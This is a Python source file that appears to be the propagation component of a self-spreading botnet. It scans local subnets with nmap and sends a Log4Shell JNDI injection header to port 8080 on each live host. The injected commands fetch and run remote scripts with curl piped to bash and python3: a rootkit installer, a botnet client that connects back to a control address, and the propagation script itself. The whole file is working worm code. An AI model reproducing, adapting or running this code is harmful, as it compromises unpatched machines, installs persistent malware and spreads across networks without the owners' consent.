#####################
# PROPAGATION SCRIPT#
#####################

import subprocess
import ipaddress
import requests
import base64

def execute_command(command):
    result = subprocess.run(command , stdout=subprocess.PIPE)
    return result.stdout.decode('utf-8')

def send_payload(host, h_open_ports, command):
    b64_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    payload = "${{jndi:ldap://10.0.2.9:1389/Basic/Command/Base64/{}}}".format(b64_command)
    headers = {
        "X-Api-Version": payload
    }
    res_list = []
    for port in h_open_ports:
        url = "http://{}:{}".format(host, port)
        try:
            res = requests.get(url, headers=headers)
            res_list.append(res)
        except:
            print("Connection refused from {}".format(url))

    return res_list
    

interfaces = execute_command(['ifconfig']).split("\n\n")
interfaces_found = []
for i in interfaces:
    spaced_words = i.split(" ")
    try: 
        inet_i = spaced_words.index('inet')
        netmask_i = spaced_words.index('netmask')

        interface_info =  {
            "inet": spaced_words[inet_i + 1],
            "netmask": spaced_words[netmask_i + 1].strip("\n"), # Removes new lines at the beggining or the end.
        }

        interfaces_found.append(interface_info)
    except:
        print("Inet and netmask not found")

open_ports = {} # Open ports found by nmap.
for i in interfaces_found:
    # Ignore localhost and docker.
    if i.get('inet') != "127.0.0.1" and i.get('inet') != "172.17.0.1":
        interface = ipaddress.ip_interface('{}/{}'.format(i.get('inet'), i.get('netmask')))
        network = str(interface.network)
        network_address, netmask_bits = network.split("/")
        print("Scaning avaiable network hosts: {}/{}".format(network_address, netmask_bits))
        output = execute_command(['nmap', '-sn', '-n', '{}/{}'.format(network_address, netmask_bits)])

        hosts_up = []
        output_splt = output.split("\n")
        for index, line in enumerate(output_splt):
            if "Nmap scan report for" in line:
                ip_list = line[21::].split(" ")
                if len(ip_list) == 1:
                    ip = ip_list[0]

                is_up_out = output_splt[index + 1]
                is_up = False
                if "Host is up" in is_up_out:
                    hosts_up.append(ip)
                    open_ports[ip] = [8080] # Add common ports.

        print("{} hosts up".format(len(hosts_up)))
        for h in hosts_up: print(h)
        print("\n")

        for h in hosts_up:
            print("Trying to propagate to {}".format(h))
            print("Open ports: {}".format(open_ports[h]))

            # Send malicious payload to possible vulnerable machines.
            # - Send payload for obfuscation.
            command = "curl -s https://raw.githubusercontent.com/davidciria/malware-botnet/main/obfuscation/rootkit/injection.sh | bash"
            send_payload(h, open_ports[h], command)

            # - Send payload to execute the client.
            command = "curl -s https://raw.githubusercontent.com/davidciria/malware-botnet/main/botnet/client.py | python3 /dev/stdin -i 10.0.2.9"
            send_payload(h, open_ports[h], command)
            
            # - Send payload to propagate.
            command = "curl -s https://raw.githubusercontent.com/davidciria/malware-botnet/main/propagation/propagation.py | python3"
            send_payload(h, open_ports[h], command)